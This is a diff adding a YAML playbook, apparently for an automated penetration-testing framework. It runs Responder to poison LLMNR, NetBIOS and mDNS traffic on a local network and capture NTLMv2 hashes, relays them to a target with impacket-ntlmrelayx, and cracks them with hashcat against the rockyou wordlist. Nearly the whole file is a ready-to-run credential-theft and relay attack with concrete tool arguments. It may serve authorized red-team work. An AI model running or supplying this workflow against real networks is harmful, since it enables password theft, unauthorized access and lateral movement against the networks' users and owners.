@@ -1,0 +1,118 @@
+name: "LLMNR / NetBIOS / MDNS Poisoning (Responder)"
+description: "Poison LLMNR, NetBIOS, and mDNS traffic with Responder to capture NTLMv2 hashes, then relay or crack them"
+version: "1.0"
+
+vars:
+  interface: "eth0"
+  relay_target: ""
+
+preflight:
+  - id: setup
+    type: log
+    message: "LLMNR/NetBIOS poisoning on {interface} (case: {case_id})"
+
+steps:
+  # ---- Phase 1: Analysis mode ----
+  - id: analyze
+    name: "Analyze network for LLMNR/NBT-NS traffic"
+    type: sequential
+    steps:
+      - id: responder_analyze
+        name: "Responder analysis mode (no poisoning)"
+        tool: responder
+        args: ["-I", "{interface}", "-A", "-v",
+               "-o", "{case_dir}/responder_analyze.log"]
+        timeout: 120
+        artifacts: ["{case_dir}/responder_analyze.log"]
+
+      - id: nmap_llmnr
+        name: "Nmap LLMNR discovery"
+        tool: nmap
+        args: ["-sU", "-p", "5355", "--script", "llmnr-info",
+               "{target}", "-oN", "{case_dir}/llmnr_nmap.txt"]
+        timeout: 60
+
+      - id: nbtscan
+        name: "NetBIOS name scan"
+        tool: nbtscan
+        args: ["-r", "{target}", "-o", "{case_dir}/nbtscan_netbios.txt"]
+        timeout: 60
+
+  # ---- Phase 2: Poison mode ----
+  - id: poison
+    name: "LLMNR/NetBIOS/mDNS poisoning"
+    type: sequential
+    steps:
+      - id: responder_poison
+        name: "Responder poisoning (capture hashes)"
+        tool: responder
+        args: ["-I", "{interface}", "-w", "-r", "-d", "-F", "-v",
+               "-o", "{case_dir}/responder_poison.log"]
+        timeout: 600
+        artifacts: ["{case_dir}/responder_poison.log"]
+
+      - id: responder_session
+        name: "Check captured hashes"
+        tool: ls
+        args: ["-la", "/usr/share/responder/logs/",
+               "-o", "{case_dir}/responder_hashes.txt"]
+        timeout: 10
+
+  # ---- Phase 3: SMB relay ----
+  - id: relay
+    name: "NTLM relay to target"
+    type: conditional
+    condition:
+      any:
+        - exists: "{relay_target}"
+    then:
+      - id: responder_relay
+        name: "Responder with SMB relay"
+        tool: responder
+        args: ["-I", "{interface}", "-w", "-r", "-d", "-F",
+               "-o", "{case_dir}/responder_relay.log"]
+        timeout: 600
+
+      - id: ntlmrelayx
+        name: "Impacket ntlmrelayx to target"
+        tool: impacket-ntlmrelayx
+        args: ["-tf", "{relay_target}",
+               "-smb2support",
+               "-o", "{case_dir}/ntlmrelayx_output"]
+        timeout: 300
+        artifacts: ["{case_dir}/ntlmrelayx_output*"]
+
+  # ---- Phase 4: Collect & crack ----
+  - id: collect
+    name: "Collect and crack captured hashes"
+    type: sequential
+    steps:
+      - id: copy_hashes
+        name: "Copy hashes from Responder logs"
+        tool: cp
+        args: ["/usr/share/responder/logs/*.txt",
+               "{case_dir}/responder_captures/"]
+        timeout: 30
+
+      - id: hashcat_crack
+        name: "Crack NTLMv2 with hashcat (mode 5600)"
+        tool: hashcat
+        args: ["-m", "5600", "{case_dir}/responder_captures/*.txt",
+               "/wordlists/rockyou.txt",
+               "--outfile", "{case_dir}/responder_cracked.txt",
+               "--show"]
+        timeout: 600
+        artifacts: ["{case_dir}/responder_cracked.txt"]
+
+  # ---- Phase 5: Report ----
+  - id: report
+    name: "Responder capture note"
+    type: log
+    message: |
+      LLMNR/NetBIOS poisoning complete on {interface}.
+      Results in {case_dir}/:
+      - Analysis: responder_analyze.log, llmnr_nmap.txt
+      - Captured hashes: responder_captures/*.txt
+      - Cracked: responder_cracked.txt
+      - Relay output: ntlmrelayx_output* (if relay target set)
+      Crack NTLMv2 hashes with: hashcat -m 5600 <hashfile> /wordlists/rockyou.txt
